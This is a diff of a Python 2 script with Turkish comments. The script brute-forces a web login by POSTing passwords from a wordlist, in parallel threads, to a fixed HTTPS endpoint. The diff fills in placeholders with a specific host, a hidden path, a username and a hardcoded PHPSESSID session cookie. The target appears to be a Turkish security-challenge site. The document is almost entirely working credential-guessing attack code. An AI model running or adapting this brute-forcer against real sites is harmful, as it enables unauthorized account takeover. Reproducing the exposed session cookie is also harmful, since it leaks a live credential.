@@ -9,23 +9,25 @@
 
 import threading
 import httplib,urllib
+import time
 atla=900
-sinir=100
+sinir=100 # aktif bağlantı
+zaman=120 #deneme süre sınırı sn cinsinden
 hatali_mesaj="Yanl\xc4\xb1\xc5\x9f" #Yanlış kelimesine karşlık geliyor
 headers = {"Content-type": "application/x-www-form-urlencoded",
             "Accept": "text/plain",
-            "PHPSESSID":"sizin cookieniz "}    
+            "PHPSESSID":"92mrl72ide5vrag3ska87ouc50"}    
 f = open("/home/user/word.txt", 'r')
 def dene(sifre,):
 	global bulundu # en püf nokta burda üstteki bi değişgene erişmek için global kulandım onun global bi değişgen olduğunu belirtiyor yoksa yeniden tanımlıyormuş python işte çok yordu beni bu :D 2 saat kadar 
 	if bulundu:
 		return 
-	c = httplib.HTTPSConnection("site_adresi.com") #https bağlantısı adındanda anlaşılacağı üzere
+	c = httplib.HTTPSConnection("demirci.siberkuvvet.com") #https bağlantısı adındanda anlaşılacağı üzere
 	sifre=sifre.replace('\n','') # şifrelerin sonunda enter kodu olan 0a geliyordu onları temizlemek için
 	#print "denenenen: "+sifre
-	params = urllib.urlencode({'kullaniciBilgi': "kullanıcı_adı", 'parolaBilgi': sifre }) # giden parametreler
+	params = urllib.urlencode({'kullaniciBilgi': "0xfff000", 'parolaBilgi': sifre }) # giden parametreler
 	print params
-	c.request("POST", "/dizin/",params ,headers) #post ediliş
+	c.request("POST", "/bf_afcdf1c574c2f80f52bd70ebd66969c9/",params ,headers) #post ediliş
 	response = c.getresponse() #responları çekmek
 	#print response.status, response.reason
 	metin=response.read() #gelen metin
@@ -49,6 +51,8 @@ while not bulundu:
 	x = threading.Thread(target=dene, args=(satir,)) #thread oluşturdu
 	threads.append(x) #listemize thread ekledi
 	x.start() #threadı başlattı
+	time.sleep(zaman)
 	
+
 
 
